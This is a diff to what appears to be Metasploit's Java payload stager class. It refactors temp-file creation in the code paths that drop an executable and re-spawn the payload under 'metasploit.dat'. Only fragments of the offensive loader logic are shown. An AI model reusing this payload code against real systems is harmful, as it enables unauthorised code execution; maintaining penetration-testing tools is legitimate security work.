@@ -47,6 +47,7 @@ import java.net.ServerSocket;
 import java.net.Socket;
 import java.net.URL;
 import java.net.URLConnection;
+import java.nio.file.Files;
 import java.security.AllPermission;
 import java.security.CodeSource;
 import java.security.Permissions;
@@ -79,7 +80,7 @@ public class Payload extends ClassLoader {
         // check if we should drop an executable
         String executableName = props.getProperty("Executable");
         if (executableName != null) {
-            File dummyTempFile = File.createTempFile("~spawn", ".tmp");
+            File dummyTempFile = Files.createTempFile("~spawn", ".tmp").toFile();
             dummyTempFile.delete();
             File tempDir = new File(dummyTempFile.getAbsolutePath() + ".dir");
             tempDir.mkdir();
@@ -97,7 +98,7 @@ public class Payload extends ClassLoader {
             // will stop spawning
             props.setProperty("Spawn", String.valueOf(spawn - 1));
             // write our class
-            File dummyTempFile = File.createTempFile("~spawn", ".tmp");
+            File dummyTempFile = Files.createTempFile("~spawn", ".tmp").toFile();
             dummyTempFile.delete();
             File tempDir = new File(dummyTempFile.getAbsolutePath() + ".dir");
             File propFile = new File(tempDir, "metasploit.dat");
